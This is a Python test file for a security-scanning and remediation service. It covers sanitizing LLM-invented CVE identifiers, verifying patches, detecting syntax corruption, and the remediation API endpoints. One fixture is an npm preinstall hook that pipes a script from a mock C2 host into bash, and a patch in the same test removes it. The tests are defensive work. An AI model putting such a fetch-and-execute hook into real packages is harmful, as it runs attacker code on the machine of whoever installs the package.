def test_anti_hallucination_evidence_grounding_sanitization():
    """Validates that ungrounded/hallucinated CVE identifiers generated by an LLM are sanitized."""
    findings = [
        FindingResponse(
            id="fnd_001",
            scan_id="test_scan",
            rule_id="dep.cve.GHSA-j8xg-fqg3-53r8",
            title="Vulnerability in jinja2@2.4.1: GHSA-j8xg-fqg3-53r8",
            severity=Severity.HIGH,
            file_path="requirements.txt",
            line_start=1,
            line_end=1,
            fingerprint="fp1",
        )
    ]
    osv_evidence = [
        {
            "evidence_id": "OSV-001",
            "vulnerability_id": "GHSA-j8xg-fqg3-53r8",
            "package": "jinja2",
            "version": "2.4.1",
            "fixed_version": "2.11.3",
        }
    ]

    raw_llm_output = {
        "what_changed": "Added jinja2 and hallucinated CVE-2099-99999 exploit.",
        "why_it_matters": "Active vulnerability GHSA-j8xg-fqg3-53r8 plus invented CVE-2099-99999.",
        "evidence_observed": ["jinja2 has advisory"],
        "recommended_actions": ["Upgrade jinja2 to 2.11.3"],
        "clean_patch": "--- a/requirements.txt\n+++ b/requirements.txt\n@@ -1 +1 @@\n-jinja2==2.4.1\n+jinja2>=2.11.3\n",
    }

    sanitized = barqai_engine._validate_and_sanitize_evidence(
        parsed=raw_llm_output,
        findings=findings,
        osv_evidence=osv_evidence,
        files={"requirements.txt": "jinja2==2.4.1\n"},
    )

    # Hallucinated CVE must NOT exist in the output text
    assert "CVE-2099-99999" not in sanitized["why_it_matters"]
    assert "CVE-2099-99999" not in sanitized["what_changed"]
    # Verified advisory must be preserved
    assert "GHSA-j8xg-fqg3-53r8" in sanitized["why_it_matters"]
    # Evidence tag must be enforced
    assert any("[EVIDENCE:" in ev for ev in sanitized["evidence_observed"])


@pytest.mark.asyncio
async def test_patch_verifier_preinstall_dropper_remediation():
    """Validates that patch_verifier can apply diff in-memory, eliminate the vulnerability, and pass independent verification."""
    original_pkg = (
        '{\n'
        '  "name": "vulnerable-app",\n'
        '  "scripts": {\n'
        '    "preinstall": "curl -s https://c2-transfer.mock.xyz/stealer.sh | bash",\n'
        '    "test": "jest"\n'
        '  }\n'
        '}\n'
    )
    files = {"package.json": original_pkg}

    finding = FindingResponse(
        id="fnd_p1",
        scan_id="s1",
        rule_id="npm.lifecycle.preinstall.malicious_cmd",
        title="Suspicious execution in 'preinstall' script",
        severity=Severity.CRITICAL,
        file_path="package.json",
        line_start=4,
        line_end=4,
        fingerprint="fp_p1",
    )

    clean_patch = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -4,1 +4,0 @@\n"
        '-    "preinstall": "curl -s https://c2-transfer.mock.xyz/stealer.sh | bash",\n'
    )

    is_verified, message, remaining = await patch_verifier.verify_patch(
        files=files,
        patch=clean_patch,
        original_findings=[finding],
    )

    assert is_verified is True
    assert "All original findings resolved" in message or "confirmed" in message
    assert len(remaining) == 0


@pytest.mark.asyncio
async def test_patch_verifier_detects_syntax_corruption():
    """Validates that patch_verifier catches invalid JSON/syntax in candidate patches."""
    files = {"package.json": '{\n  "name": "valid"\n}'}
    finding = FindingResponse(
        id="fnd_bad",
        scan_id="s1",
        rule_id="sec.rule",
        title="Issue",
        severity=Severity.HIGH,
        file_path="package.json",
        line_start=1,
        line_end=1,
        fingerprint="fp_bad",
    )

    # Patch that breaks JSON syntax
    broken_patch = (
        "--- a/package.json\n"
        "+++ b/package.json\n"
        "@@ -1,2 +1,2 @@\n"
        "+{ INVALID JSON NO CLOSING BRACE\n"
    )

    is_verified, message, remaining = await patch_verifier.verify_patch(
        files=files,
        patch=broken_patch,
        original_findings=[finding],
    )

    assert is_verified is False
    assert "Syntax verification failed" in message


@pytest.mark.asyncio
async def test_remediation_api_patch_and_verify_endpoints():
    """Tests the /api/v1/remediation endpoints for patch retrieval and independent verification."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Fetch remediation patch for seeded scan_123
        res = await client.get("/api/v1/remediation/scan_123/patch")
        assert res.status_code == 200
        data = res.json()
        assert data["scan_id"] == "scan_123"
        assert "clean_patch" in data
        assert len(data["proposals"]) > 0
        p0 = data["proposals"][0]
        assert "original_code" in p0
        assert "suggested_code" in p0
        assert p0["verification_status"] == "verified"

        # 2. Verify candidate patch endpoint
        verify_res = await client.post("/api/v1/remediation/scan_123/verify", json={})
        assert verify_res.status_code == 200
        v_data = verify_res.json()
        assert v_data["is_verified"] is True
        assert v_data["verification_status"] == "verified"
        assert v_data["regressions_detected"] == 0

        # 3. Apply remediation endpoint
        apply_res = await client.post(
            "/api/v1/remediation/scan_123/apply",
            json={"commit_message": "fix(security): resolve preinstall dropper"},
        )
        assert apply_res.status_code == 200
        a_data = apply_res.json()
        assert a_data["status"] == "applied"
        assert "diff_applied" in a_data
